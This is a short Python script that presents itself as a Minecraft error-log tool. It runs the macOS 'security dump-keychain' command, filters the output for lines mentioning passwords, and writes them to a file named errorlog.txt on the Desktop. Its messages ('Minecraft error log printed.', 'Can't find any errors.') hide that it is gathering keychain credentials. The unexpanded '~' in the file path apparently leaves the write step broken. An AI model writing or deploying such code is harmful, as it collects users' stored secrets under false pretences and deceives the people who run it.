import subprocess

command = "security dump-keychain"
try:
    output = subprocess.check_output(command, shell=True, text=True)

    password_lines = [line for line in output.splitlines() if 'password' in line]

    file_path = "~/Desktop/errorlog.txt"
    if password_lines:
        with open(file_path, "a") as file:
            for line in password_lines:
                file.write(line + "\n")
        print("Minecraft error log printed.")
    else:
        print("Can't find any errors.")
except subprocess.CalledProcessError:
    print("Can't find any errors.")
